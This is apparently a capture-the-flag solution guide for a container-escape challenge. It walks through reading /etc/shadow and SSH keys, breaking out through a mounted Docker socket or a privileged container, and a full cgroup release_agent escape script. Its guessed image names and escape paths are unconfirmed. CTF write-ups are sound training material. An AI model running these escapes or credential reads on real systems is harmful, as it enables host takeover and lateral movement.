# Stolen Schematics - Solution Guide

## Challenge Overview

**Name:** Stolen Schematics
**Points:** 34800
**Category:** Container Escape / Privilege Escalation
**Connection:** `ssh player@instance.ctf.tdho.st -p 32904` (password: `reyalp`)

## Challenge Description

> A game server has been compromised using a malicious jar file, to secure access an SSH server has been installed for remote access. Now the job has been pushed to you, escape the container, compromise another game server and retrieve the flag from a file in their server.
>
> An older build of this server image was accidently left public on our ghcr.io registry, might be worth a look...

## Attack Path

1. **Recon the Public Docker Image** (ghcr.io)
2. **SSH into the compromised server**
3. **Identify container escape vector**
4. **Escape to host system**
5. **Find and compromise another game server**
6. **Retrieve the flag**

## Step 1: Investigate Public Docker Image

The challenge hints at a public Docker image. Try these:

```bash
# Common naming patterns for ghcr.io
docker pull ghcr.io/talldwarf/game-server:latest
docker pull ghcr.io/talldwarf/game-server:old
docker pull ghcr.io/tdhost/game-server:latest

# Inspect the image
docker images
docker history <image-id> --no-trunc
docker inspect <image-id>

# Look for secrets in the image
docker run -it <image-id> /bin/sh
find / -name '*.key' -o -name '*.pem' -o -name 'id_rsa' -o -name '.ssh'
env
cat /etc/shadow
find / -name '*.jar'
```

### What to look for:
- Hardcoded credentials
- SSH keys
- Configuration files
- The malicious JAR file
- Vulnerable configurations
- Docker socket mount points

## Step 2: SSH Connection & Initial Recon

```bash
ssh player@instance.ctf.tdho.st -p 32904
# Password: reyalp

# Basic info
whoami
id
uname -a
hostname

# Confirm in container
cat /proc/1/cgroup        # Look for docker/containerd
ls -la /.dockerenv        # Docker marker file
cat /proc/self/mountinfo  # Check mounts
```

## Step 3: Identify Container Escape Vectors

### Common escape methods:

#### A. Docker Socket Mounted
```bash
ls -la /var/run/docker.sock
# If present, you can control the host Docker

docker ps                 # List containers
docker images            # List images

# Escape by mounting host filesystem
docker run -v /:/hostfs -it alpine chroot /hostfs sh

# Or create privileged container
docker run --privileged -v /:/hostfs -it alpine sh
```

#### B. Privileged Container
```bash
# Check capabilities
capsh --print
cat /proc/self/status | grep Cap

# If privileged, can access host devices
ls -la /dev/
fdisk -l

# Mount host filesystem
mkdir /mnt/host
mount /dev/sda1 /mnt/host
```

#### C. Writable cgroup or /proc
```bash
# Check for writable cgroup
ls -la /sys/fs/cgroup/
# If writable, can execute on host

# Exploit example
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /flag > $host_path/flag.txt" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

#### D. SUID Binaries
```bash
find / -perm -4000 2>/dev/null
# Look for unusual SUID binaries
# Or docker/runc SUID
```

#### E. Kernel Exploits
```bash
uname -a
# Search for kernel version exploits
```

#### F. Mounted Host Directories
```bash
mount | grep -v 'type overlay'
df -h
# Look for host paths mounted into container
```

## Step 4: Escape to Host

Once you find the escape vector, execute it:

### Example: Docker Socket Escape
```bash
# Mount host root
docker run -v /:/host -it alpine chroot /host /bin/bash

# Now on host
ls /
# Look for other containers
docker ps
```

### Example: Privileged Container
```bash
# Find host disk
fdisk -l
# Mount it
mkdir /hostfs
mount /dev/vda1 /hostfs
cd /hostfs
```

## Step 5: Find Another Game Server

Once on the host:

```bash
# List running containers
docker ps

# Check for other game servers
docker ps -a | grep game
docker ps -a | grep server

# Inspect containers
docker inspect <container-id>

# Access another container
docker exec -it <container-id> /bin/sh

# Or mount its filesystem
docker export <container-id> | tar -C /tmp/extract -xvf -
```

## Step 6: Retrieve the Flag

```bash
# Once in the other game server container
find / -name 'flag*' -o -name '*flag*' 2>/dev/null
find / -name 'FLAG*' -o -name '*FLAG*' 2>/dev/null

# Common locations
cat /flag.txt
cat /flag
cat /root/flag.txt
cat /home/*/flag.txt
cat /opt/flag.txt
cat /var/flag.txt
```

## Common Pitfalls

1. **Not checking the public image** - It likely contains credentials or hints
2. **Missing docker.sock** - Most likely escape vector
3. **Not checking for other containers** - Flag is in "another game server"
4. **Wrong container** - Make sure you're in the target container
5. **Insufficient privileges** - Check capabilities with `capsh --print`

## Tools That May Help

- **docker** - If socket is mounted
- **mount** - For mounting host filesystems
- **capsh** - Check capabilities
- **fdisk/lsblk** - Find host disks
- **nsenter** - Enter namespaces
- **runc** - Container runtime

## Quick Win Scripts

### Script 1: Auto-detect escape method
```bash
#!/bin/bash
echo "[*] Checking docker socket..."
if [ -S /var/run/docker.sock ]; then
    echo "[+] Docker socket found!"
    docker ps
fi

echo "[*] Checking capabilities..."
capsh --print | grep cap_sys_admin

echo "[*] Checking for privileged..."
if [ -c /dev/kmsg ]; then
    echo "[+] Likely privileged!"
fi

echo "[*] Checking mounts..."
mount | grep -v overlay
```

### Script 2: Docker socket escape
```bash
#!/bin/bash
if [ -S /var/run/docker.sock ]; then
    echo "[+] Escaping via docker socket..."
    docker run -v /:/hostfs --rm -it alpine chroot /hostfs /bin/bash
fi
```

## Solution Checklist

- [ ] Investigate public ghcr.io image
- [ ] SSH into player@instance
- [ ] Identify if in container
- [ ] Find escape vector
- [ ] Escape to host
- [ ] List running containers
- [ ] Access another game server container
- [ ] Find and read flag

## Resources

- [Docker Breakout Techniques](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security)
- [Container Escape Methods](https://github.com/Frichetten/CVE-2019-5736-PoC)
- [Linux Capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html)

---

**Next Steps:** Connect via SSH and start reconnaissance!
